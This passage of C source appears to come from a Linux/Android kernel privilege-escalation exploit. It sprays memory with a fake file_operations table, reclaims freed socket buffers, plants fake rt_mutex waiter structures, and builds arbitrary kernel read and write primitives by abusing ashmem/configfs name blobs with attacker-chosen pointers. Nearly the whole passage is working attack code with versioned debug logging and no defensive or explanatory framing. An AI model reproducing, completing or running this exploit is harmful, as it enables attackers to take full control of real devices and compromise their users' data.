    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      pr_info("v116 V6 base=0x%016llx attempt=%d/%d\n",
              (unsigned long long)base, attempt, max_attempts);
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
  }
  pr_warning(
      "prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

void util_reclaim_payload_spray(void) {
  long frame_off = (long)FOPS_TABLE_OFF + (long)SKB_DATA_DELTA;
  if (!skb_buf || frame_off < 0 || frame_off + 0x100 > 2 * (long)PAGE_SIZE) {
    return;
  }
  size_t region = (size_t)32 << 20;
  unsigned char *m = mmap(NULL, region, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  if (m == MAP_FAILED) {
    return;
  }
  unsigned char tpl[PAGE_SIZE];
  memset(tpl, 0, sizeof(tpl));
  memcpy(tpl + frame_off, skb_buf + FOPS_TABLE_OFF, 0x100);
  for (size_t off = 0; off < region; off += PAGE_SIZE) {
    memcpy(m + off, tpl, sizeof(tpl));
  }
  if (frame_oracle_spray_n < FRAME_ORACLE_SPRAY_MAX) {
    frame_oracle_spray[frame_oracle_spray_n] = m;
    frame_oracle_spray_len[frame_oracle_spray_n] = region;
    frame_oracle_spray_n++;
  }
  pr_info("slide reclaim spray region=%zu frame_off=0x%lx tbl=0x100 pinned\n",
          region, (unsigned long)frame_off);
}

int util_frame_regrab_burst(void) {
  if (reclaim_sv[0][0] < 0 || !skb_buf) {
    return 0;
  }
  struct iovec iov;
  struct msghdr msg;
  memset(&iov, 0, sizeof(iov));
  memset(&msg, 0, sizeof(msg));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  int sent = 0;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    if (reclaim_sv[i][0] < 0) {
      continue;
    }
    errno = 0;
    ssize_t s = sendmsg(reclaim_sv[i][0], &msg, MSG_DONTWAIT);
    if (s <= 0) {
      continue;
    }
    sent++;
  }
  return sent;
}

int util_frame_oracle_marker(const char *tag, uint64_t marker,
                             size_t marker_off) {
  const size_t frame_off = (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA);
  const size_t payload_off = marker_off + (size_t)(-SKB_DATA_DELTA);
  const int have_marker = marker != 0;
  int srcA = -1;
  int srcB = -1;
  long mkA = 0;
  long mkB = 0;
  long diffA = 0;
  long diffB = 0;
  long scannedA = 0;
  long scannedB = 0;

  if (skb_buf && frame_off + 0x100 <= PAGE_SIZE &&
      marker_off + sizeof(uint64_t) <= PAGE_SIZE) {
    unsigned char tpl[PAGE_SIZE];
    memset(tpl, 0, sizeof(tpl));
    memcpy(tpl + frame_off, skb_buf + FOPS_TABLE_OFF, 0x100);
    uint64_t tpl_marker = 0;
    memcpy(&tpl_marker, tpl + marker_off, sizeof(tpl_marker));
    for (int s = 0; s < frame_oracle_spray_n; s++) {
      unsigned char *m = frame_oracle_spray[s];
      size_t len = frame_oracle_spray_len[s];
      for (size_t off = 0; off + PAGE_SIZE <= len; off += PAGE_SIZE) {
        unsigned char *p = m + off;
        uint64_t v = 0;
        memcpy(&v, p + marker_off, sizeof(v));
        scannedA++;
        if (have_marker && v == marker && marker != tpl_marker) {
          mkA++;
          continue;
        }
        if (memcmp(p, tpl, PAGE_SIZE) != 0) {
          diffA++;
        }
      }
    }
    srcA = mkA > 0 ? 1 : (scannedA > 0 ? 0 : -1);
  }

  uint64_t tpl_marker_b = 0;
  if (skb_buf && payload_off + sizeof(tpl_marker_b) <= SKB_SEND_SIZE) {
    memcpy(&tpl_marker_b, skb_buf + payload_off, sizeof(tpl_marker_b));
  }
  int fds[1 + SKB_RECLAIM_SENDS];
  int nfds = 0;
  fds[nfds++] = g_payload_peek_fd;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    fds[nfds++] = reclaim_sv[i][1];
  }
  for (int k = 0; k < nfds; k++) {
    if (fds[k] < 0) {
      continue;
    }
    static unsigned char peekbuf[0x2400];
    ssize_t rd =
        recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
    if (rd <= 0) {
      continue;
    }
    scannedB++;
    uint64_t v = 0;
    if ((size_t)rd >= payload_off + sizeof(v)) {
      memcpy(&v, peekbuf + payload_off, sizeof(v));
    }
    if (have_marker && v == marker && marker != tpl_marker_b) {
      mkB++;
      continue;
    }
    if (skb_buf && memcmp(peekbuf, skb_buf, (size_t)rd) != 0) {
      diffB++;
    }
  }
  srcB = mkB > 0 ? 1 : (scannedB > 0 ? 0 : -1);

  int owned = (mkA > 0 || mkB > 0) ? 1 : ((srcA == 0 || srcB == 0) ? 0 : -1);
  pr_info("v113 frame-oracle owned=%d srcA=%d srcB=%d hits=%ld "
          "scanned=%ld base=%p tag=%s mkA=%ld mkB=%ld diffA=%ld diffB=%ld "
          "marker=%016llx moff=0x%zx\n",
          owned, srcA, srcB, mkA + mkB, scannedA + scannedB, (void *)page_base,
          tag ? tag : "-", mkA, mkB, diffA, diffB, (unsigned long long)marker,
          marker_off);
  return owned;
}

int util_frame_oracle(const char *tag) {
#ifdef ASHMEM_MISC_FOPS_SLOT
  return util_frame_oracle_marker(tag, (uint64_t)ASHMEM_MISC_FOPS_SLOT,
                                  (size_t)ARM_MARK_OFF);
#else
  return util_frame_oracle_marker(tag, 0, (size_t)ARM_MARK_OFF);
#endif
}

void util_v121e_mark_readback(const char *when) {
  const size_t frame_offs[4] = {
      (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA),
      (size_t)ARM_MARK_OFF,
      (size_t)(ARM_MARK_OFF + 8),
      (size_t)PROBE_MARK_OFF,
  };
  const size_t delta = (size_t)(-SKB_DATA_DELTA);
  uint64_t tpl[4] = {0, 0, 0, 0};
  if (skb_buf) {
    for (int i = 0; i < 4; i++) {
      size_t po = frame_offs[i] + delta;
      if (po + sizeof(uint64_t) <= (size_t)SKB_SEND_SIZE) {
        memcpy(&tpl[i], skb_buf + po, sizeof(uint64_t));
      }
    }
  }
  int fds[1 + SKB_RECLAIM_SENDS];
  int nfds = 0;
  fds[nfds++] = g_payload_peek_fd;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    fds[nfds++] = reclaim_sv[i][1];
  }
  for (int k = 0; k < nfds; k++) {
    if (fds[k] < 0) {
      continue;
    }
    static unsigned char peekbuf[0x2400];
    ssize_t rd =
        recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
    if (rd <= 0) {
      continue;
    }
    uint64_t v[4] = {0, 0, 0, 0};
    int okv[4] = {0, 0, 0, 0};
    for (int i = 0; i < 4; i++) {
      size_t po = frame_offs[i] + delta;
      if (po + sizeof(uint64_t) <= (size_t)rd) {
        memcpy(&v[i], peekbuf + po, sizeof(uint64_t));
        okv[i] = 1;
      }
    }
    int chg = skb_buf ? (memcmp(peekbuf, skb_buf, (size_t)rd) != 0) : -1;
    pr_warning("v121e arm mark readback when=%s fd=%d rd=%zd "
               "f180=%016llx f188=%016llx f190=%016llx f300=%016llx "
               "t188=%016llx chg=%d ok=%d%d%d%d\n",
               when ? when : "-", fds[k], rd, (unsigned long long)v[0],
               (unsigned long long)v[1], (unsigned long long)v[2],
               (unsigned long long)v[3], (unsigned long long)tpl[1], chg,
               okv[0], okv[1], okv[2], okv[3]);
  }
}

int util_v129_prego_gate(int probe_fd, uint64_t glk, const char *when) {
  const size_t frame_offs[4] = {
      (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA),
      (size_t)ARM_MARK_OFF,
      (size_t)(ARM_MARK_OFF + 8),
      (size_t)PROBE_MARK_OFF,
  };
  const size_t delta = (size_t)(-SKB_DATA_DELTA);
  int pass = 1;
  int nfds = 0;
  int fds[1 + SKB_RECLAIM_SENDS];
  fds[nfds++] = g_payload_peek_fd;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    fds[nfds++] = reclaim_sv[i][1];
  }
  static unsigned char peekbuf[0x2400];
  for (int k = 0; k < nfds; k++) {
    if (fds[k] < 0) {
      continue;
    }
    ssize_t rd =
        recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
    if (rd <= 0) {
      continue;
    }
    uint64_t tpl188 = 0;
    if (skb_buf) {
      size_t po = frame_offs[1] + delta;
      if (po + sizeof(uint64_t) <= (size_t)SKB_SEND_SIZE) {
        memcpy(&tpl188, skb_buf + po, sizeof(uint64_t));
      }
    }
    uint64_t f188 = 0, f300 = 0;
    int ok188 = 0, ok300 = 0;
    for (int i = 0; i < 4; i++) {
      size_t po = frame_offs[i] + delta;
      if (po + sizeof(uint64_t) <= (size_t)rd) {
        if (i == 1) {
          memcpy(&f188, peekbuf + po, sizeof(uint64_t));
          ok188 = 1;
        } else if (i == 3) {
          memcpy(&f300, peekbuf + po, sizeof(uint64_t));
          ok300 = 1;
        }
      }
    }
    int fd_ok = 1;
    if (ok188 && tpl188 != 0 && f188 != tpl188) {
      fd_ok = 0;
    }
    if (ok300 && f300 != 0) {
      fd_ok = 0;
    }
    if (!fd_ok) {
      pass = 0;
    }
    pr_warning("v129 prego-gate when=%s fd=%d rd=%zd f188=%016llx "
               "t188=%016llx f300=%016llx fd_ok=%d\n",
               when ? when : "-", fds[k], rd, (unsigned long long)f188,
               (unsigned long long)tpl188, (unsigned long long)f300, fd_ok);
  }
  unsigned char lb[32];
  memset(lb, 0, sizeof(lb));
  ssize_t lrd = configfs_read_once(probe_fd, glk, lb, sizeof(lb));
  uint64_t wl = 0, root = 0, lmost = 0, owner = 0;
  if (lrd == (ssize_t)sizeof(lb)) {
    memcpy(&wl, lb + 0x00, 8);
    memcpy(&root, lb + 0x08, 8);
    memcpy(&lmost, lb + 0x10, 8);
    memcpy(&owner, lb + 0x18, 8);
    if (wl != 0 || root != 0 || lmost != 0 || owner != 0) {
      pass = 0;
    }
  } else {
    pass = 0;
  }
  pr_warning("v129 prego-gate when=%s glk=%016llx lrd=%zd wait_lock=%016llx "
             "rb_root=%016llx rb_leftmost=%016llx owner=%016llx verdict=%s\n",
             when ? when : "-", (unsigned long long)glk, lrd,
             (unsigned long long)wl, (unsigned long long)root,
             (unsigned long long)lmost, (unsigned long long)owner,
             pass ? "PASS" : "REJECT");
  return pass ? 0 : -1;
}

#define V122_W_FRAME_OFF ((size_t)(W0_OFF + (long)SKB_DATA_DELTA))
_Static_assert(W0_OFF + (long)SKB_DATA_DELTA == 0x13a0,
               "v122 W band frame offset");
_Static_assert(V122_W_FRAME_OFF + FAKE_WAITER_DEADLINE_OFF + sizeof(uint64_t) <=
                   2 * (size_t)PAGE_SIZE,
               "v122 W band must fit the two-page mirror template");

void util_frame_band_dump(const char *tag) {
  static int on = -1;
  if (on < 0) {
    on = env_flag("SLIDE_W_BAND_DUMP", 0);
  }
  if (!on) {
    return;
  }
  static const size_t band[9] = {
      V122_W_FRAME_OFF + WAITER_TREE_ENTRY_OFF + 0x00,
      V122_W_FRAME_OFF + WAITER_TREE_ENTRY_OFF + 0x08,
      V122_W_FRAME_OFF + WAITER_TREE_ENTRY_OFF + 0x10,
      V122_W_FRAME_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF,
      V122_W_FRAME_OFF + FAKE_WAITER_TASK_OFF,
      V122_W_FRAME_OFF + FAKE_WAITER_LOCK_OFF,
      V122_W_FRAME_OFF + FAKE_WAITER_WAKE_STATE_OFF,
      V122_W_FRAME_OFF + FAKE_WAITER_PRIO_OFF,
      V122_W_FRAME_OFF + FAKE_WAITER_DEADLINE_OFF,
  };
  const size_t band_hi = band[8];
  const size_t delta = (size_t)(-SKB_DATA_DELTA);
  const size_t stream_off = band[0] + delta;

  if (frame_oracle_spray_n > 0 && skb_buf) {
    unsigned char tpl[2 * PAGE_SIZE];
    const size_t frame_off = (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA);
    memset(tpl, 0, sizeof(tpl));
    if (frame_off + 0x100 <= PAGE_SIZE) {
      memcpy(tpl + frame_off, skb_buf + FOPS_TABLE_OFF, 0x100);
      memcpy(tpl + PAGE_SIZE + frame_off, skb_buf + FOPS_TABLE_OFF, 0x100);
    }
    uint64_t w0[9] = {0};
    uint64_t wd[9] = {0};
    int n = 0;
    int nd = -1;
    for (int s = 0; s < frame_oracle_spray_n; s++) {
      unsigned char *m = frame_oracle_spray[s];
      size_t len = frame_oracle_spray_len[s];
      for (size_t off = 0; off + PAGE_SIZE <= len; off += PAGE_SIZE) {
        unsigned char *p = m + off;
        uint64_t v[9];
        int dev = 0;
        if (off + band_hi + sizeof(uint64_t) > len) {
          continue;
        }
        for (int i = 0; i < 9; i++) {
          uint64_t t = 0;
          memcpy(&v[i], p + band[i], sizeof(uint64_t));
          memcpy(&t, tpl + band[i], sizeof(t));
          if (v[i] != t) {
            dev = 1;
          }
        }
        if (n == 0) {
          memcpy(w0, v, sizeof(w0));
        }
        if (dev && nd < 0) {
          nd = n;
          memcpy(wd, v, sizeof(wd));
        }
        n++;
      }
    }
    if (n > 0) {
      const uint64_t *w = nd >= 0 ? wd : w0;
      pr_warning("v122 W-band tag=%s src=A idx=%d n=%d off=0x%zx "
                 "w=[%016llx %016llx %016llx %016llx %016llx %016llx "
                 "%016llx %016llx %016llx]\n",
                 tag ? tag : "-", nd >= 0 ? nd : 0, n, band[0],
                 (unsigned long long)w[0], (unsigned long long)w[1],
                 (unsigned long long)w[2], (unsigned long long)w[3],
                 (unsigned long long)w[4], (unsigned long long)w[5],
                 (unsigned long long)w[6], (unsigned long long)w[7],
                 (unsigned long long)w[8]);
    }
  }

  {
    int fds[1 + SKB_RECLAIM_SENDS];
    int nfds = 0;
    fds[nfds++] = g_payload_peek_fd;
    for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
      fds[nfds++] = reclaim_sv[i][1];
    }
    for (int k = 0; k < nfds; k++) {
      if (fds[k] < 0) {
        continue;
      }
      static unsigned char peekbuf[0x2400];
      ssize_t rd =
          recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
      if (rd <= 0) {
        continue;
      }
      uint64_t v[9] = {0};
      for (int i = 0; i < 9; i++) {
        size_t po = band[i] + delta;
        if (po + sizeof(uint64_t) <= (size_t)rd) {
          memcpy(&v[i], peekbuf + po, sizeof(v[i]));
        }
      }
      pr_warning("v122 W-band tag=%s src=B idx=%d n=%d off=0x%zx "
                 "w=[%016llx %016llx %016llx %016llx %016llx %016llx "
                 "%016llx %016llx %016llx]\n",
                 tag ? tag : "-", k, nfds, stream_off, (unsigned long long)v[0],
                 (unsigned long long)v[1], (unsigned long long)v[2],
                 (unsigned long long)v[3], (unsigned long long)v[4],
                 (unsigned long long)v[5], (unsigned long long)v[6],
                 (unsigned long long)v[7], (unsigned long long)v[8]);
    }
  }
}

void util_stack_page_scan(const char *tag, uint64_t pcv) {
  static int on = -1;
  if (on < 0) {
    on = env_flag("SLIDE_PHASE_OBS", 0);
  }
  if (!on) {
    return;
  }
  const uint64_t lockv = fake_lock;
  const size_t delta = (size_t)(-SKB_DATA_DELTA);

  {
    uint64_t gA = 0, lA = 0;
    int hitA = -1;
    for (int s = 0; s < frame_oracle_spray_n; s++) {
      unsigned char *m = frame_oracle_spray[s];
      size_t len = frame_oracle_spray_len[s];
      if (len > 4u << 20) {
        len = 4u << 20;
      }
      for (size_t off = 0; off + 8 <= len; off += 8) {
        uint64_t v = 0;
        memcpy(&v, m + off, sizeof(v));
        if (v == pcv) {
          gA = (uint64_t)off;
          memcpy(&lA, m + off + 0x38, sizeof(lA));
          hitA = lA == lockv ? 1 : 0;
          break;
        }
      }
      if (gA) {
        break;
      }
    }
    pr_warning("v135 ghost tag=%s src=A pc=%016llx ghost_off=0x%llx "
               "lock_at_ghost=0x%llx lockv=0x%llx hit=%d\n",
               tag ? tag : "-", (unsigned long long)pcv, (unsigned long long)gA,
               (unsigned long long)lA, (unsigned long long)lockv, hitA);
  }

  {
    int fds[1 + SKB_RECLAIM_SENDS];
    int nfds = 0;
    fds[nfds++] = g_payload_peek_fd;
    for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
      fds[nfds++] = reclaim_sv[i][1];
    }
    for (int k = 0; k < nfds; k++) {
      if (fds[k] < 0) {
        continue;
      }
      static unsigned char peekbuf[SKB_SEND_SIZE];
      ssize_t rd =
          recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
      if (rd <= 0) {
        continue;
      }
      uint64_t gB = 0, lB = 0;
      int hitB = -1;
      for (size_t off = 0; off + 8 <= (size_t)rd; off += 8) {
        uint64_t v = 0;
        memcpy(&v, peekbuf + off, sizeof(v));
        if (v == pcv) {
          gB = (uint64_t)off;
          memcpy(&lB, peekbuf + off + 0x38, sizeof(lB));
          hitB = lB == lockv ? 1 : 0;
          break;
        }
      }
      uint64_t s0 = 0, s1 = 0;
      if (0x3b48 + 8 <= (size_t)rd) {
        memcpy(&s0, peekbuf + 0x3b48, sizeof(s0));
      }
      if (0x7b48 + 8 <= (size_t)rd) {
        memcpy(&s1, peekbuf + 0x7b48, sizeof(s1));
      }
      pr_warning("v135 ghost tag=%s src=B idx=%d n=%d pc=%016llx "
                 "ghost_off=0x%llx lock_at_ghost=0x%llx lockv=0x%llx "
                 "hit=%d slotA(0x3b48)=0x%llx slotB(0x7b48)=0x%llx "
                 "rd=%zd delta=0x%zx\n",
                 tag ? tag : "-", k, nfds, (unsigned long long)pcv,
                 (unsigned long long)gB, (unsigned long long)lB,
                 (unsigned long long)lockv, hitB, (unsigned long long)s0,
                 (unsigned long long)s1, rd, delta);
    }
  }
}

int util_frame_guard(int probe_fd) {
  const char *gm = getenv("SLIDE_FRAME_GUARD_MODE");
  const int gate_mode = gm && !strcmp(gm, "gate");
  if (!fake_fops) {
    pr_warning("v105 frame guard: no fake_fops (%s)\n",
               gate_mode ? "gate: park" : "canary: continue");
    return gate_mode ? 0 : 1;
  }
  if (probe_fd < 0) {
    pr_warning("v105 frame guard: no probe fd (%s)\n",
               gate_mode ? "gate: park" : "canary: continue");
    return gate_mode ? 0 : 1;
  }
  unsigned char scratch[0x100];
  const unsigned char *baked;
  if (skb_buf) {
    baked = skb_buf + FOPS_TABLE_OFF;
  } else {
    memset(scratch, 0, sizeof(scratch));
    put_fake_fops_table(scratch, 0);
    baked = scratch;
  }
  uint64_t owner_expect = 0;
  uint64_t open_expect = 0;
  memcpy(&owner_expect, baked + FOPS_OWNER_OFF, sizeof(owner_expect));
  memcpy(&open_expect, baked + FOPS_OPEN_OFF, sizeof(open_expect));
  int attempts = env_int_range("SLIDE_FRAME_REGRAB", 4, 1, 16);
  uint64_t owner = 0;
  uint64_t openv = 0;
  int probe_live = 0;
  for (int a = 1; a <= attempts; a++) {
    util_frame_regrab_burst();
    ssize_t rd1 = configfs_read_once(probe_fd, fake_fops + FOPS_OWNER_OFF,
                                     &owner, sizeof(owner));
    ssize_t rd2 = configfs_read_once(probe_fd, fake_fops + FOPS_OPEN_OFF,
                                     &openv, sizeof(openv));
    if (rd1 == (ssize_t)sizeof(owner) || rd2 == (ssize_t)sizeof(openv)) {
      probe_live = 1;
    }
    if (rd1 == (ssize_t)sizeof(owner) && rd2 == (ssize_t)sizeof(openv) &&
        owner == owner_expect && openv == open_expect) {
      return 1;
    }
    if (a < attempts) {
      usleep(100000);
    }
  }
  int owned = util_frame_oracle("guard");
  if (gate_mode) {
    pr_warning("v105 frame-foreign owner=%llx -> park\n",
               (unsigned long long)owner);
    return 0;
  }
  if (env_flag("SLIDE_FRAME_GUARD_ORACLE", 1) && owned != 1) {
    pr_warning("v113 frame-guard: oracle=%d owner=%llx -> park without "
               "openat\n",
               owned, (unsigned long long)owner);
    return 0;
  }
  if (!probe_live) {
    static int v113_warned;
    if (!v113_warned) {
      v113_warned = 1;
      pr_warning("v105 canary-continue (probe f_op not configfs => "
                 "verdict structurally unavailable)\n");
    }
  } else {
    pr_warning("v105 frame-foreign owner=%llx -> canary-continue\n",
               (unsigned long long)owner);
  }
  return 1;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data,
                            size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - CFG_NAME_BIAS, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - CFG_NAME_BIAS, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - CFG_NAME_BIAS, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(CFG_PREFIX_COUNT - len);
  put64(blob, CFG_PAGE_OFF - CFG_NAME_BIAS, (uint64_t)target - (uint64_t)pos);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) { return value >= 0xffff800000000000ULL; }

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data,
                          size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

int env_flag(const char *name, int def) {
  const char *v = getenv(name);
  if (v == NULL || *v == '\0') {
    return def;
  }
  return !(strcmp(v, "0") == 0 || strcasecmp(v, "false") == 0 ||
           strcasecmp(v, "no") == 0 || strcasecmp(v, "off") == 0);
}

int env_int_range(const char *name, int def, int min, int max) {
  const char *v = getenv(name);
  if (v == NULL || *v == '\0') {
    return def;
  }
  char *end = NULL;
  long parsed = strtol(v, &end, 0);
  if (end == v || *end != '\0') {
    return def;
  }
  if (parsed < min) {
    parsed = min;
  }
  if (parsed > max) {
    parsed = max;
  }
  return (int)parsed;
}

int payload_peek_fd(void) { return g_payload_peek_fd; }

const unsigned char *payload_template(void) { return skb_buf; }
